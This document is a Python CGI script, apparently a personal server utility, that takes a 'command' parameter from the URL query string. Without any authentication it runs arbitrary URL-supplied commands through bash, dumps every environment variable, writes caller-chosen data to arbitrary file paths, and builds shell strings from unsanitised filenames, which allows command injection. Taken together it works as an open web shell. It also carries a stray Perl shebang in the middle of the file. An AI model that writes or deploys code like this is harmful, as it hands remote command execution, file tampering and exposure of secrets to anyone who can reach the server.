#!/usr/bin/env python3
import sys
import os
from urllib.parse import urlparse, parse_qs, unquote
import subprocess
import traceback
import json
import io
# from baseballref.getdata import BaseballReference
# os.system("touch /tmp/mmmm")
#!/usr/bin/perl
print("Content-type: text/html\n\n")
# print(os.environ["QUERY_STRING"])
# print("<br/>")


def runcommand(command):
    p = subprocess.Popen(["bash", "-c", command],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, errors = p.communicate()
    return {'command': command, 'stdout': output, 'stderr': errors}


try:
    command = parse_qs(os.environ["QUERY_STRING"])["command"][0]
    fields = parse_qs(os.environ["QUERY_STRING"])
    if "filename" in fields:
        filename = unquote(fields["filename"][0])
        filename = os.path.realpath(os.path.join(
            os.getcwd(), "../", filename))
    if command == 'env':
        for key in os.environ:
            print(f"""{key}={os.environ[key]}<br/>""")
            # print("\n")

    elif command == 'list':
        print(f"""filename: {filename}""")
        result = runcommand(f"""ls -l '{filename}'""")
        print(f"""output: {result["stdout"]}""")
        print(f"""errors: {result["stderr"]}""")
        print("<br/>")
    elif command == 'pwd':
        print(f"command : {command}")
        result = runcommand(command)
        print(f"""output: {result["stdout"]}""")
        print(f"""errors: {result["stderr"]}""")
        print("<br/>")
    elif command == 'exec':
        result = {}
        result['exec'] = fields['exec'][0]
        result = runcommand(fields['exec'][0])
        if 'output' in fields:
            filename = fields['output'][0]
            with open(filename, "w") as f:
                f.write(result['stdout'])
            result['output'] = filename
        result['stdout'] = result["stdout"].split('\n')
        result['stderr'] = result["stderr"].split('\n')
        print(json.dumps(result))
    elif command == 'file':
        result = {}
        result['filename'] = fields['filename'][0]
        result['data'] = fields['data'][0]
        jsonobject = json.loads(result['data'])
        if 'decode' in fields and fields['decode']:
            result['data'] = jsonobject
        else:
            result['data'] = json.dumps(jsonobject, indent=2)
        with open(result['filename'], "w") as f:
            f.write(result['data'])
        result['output'] = filename
        print(json.dumps(result))
    elif command == 'delete':
        result = runcommand('whoami')
        print(f"""command: {result["command"]}""")
        print(f"""output: {result["stdout"]}""")
        print(f"""errors: {result["stderr"]}""")
        result = runcommand('groups')
        print(f"""command: {result["command"]}""")
        print(f"""output: {result["stdout"]}""")
        print(f"""errors: {result["stderr"]}""")
        command = f"""mv -v '{filename}' {os.environ["HOME"]}/tmp"""
        result = runcommand(command)
        print(f"""command: {result["command"]}""")
        print(f"""output: {result["stdout"]}""")
        print(f"""errors: {result["stderr"]}""")
        print("<br/>")
        pass
except Exception as e:
    result = {}
    f = io.StringIO()
    traceback.print_exc(file=f)
    f.seek(0)
    result['exception'] = f.read()
    print(json.dumps(result))
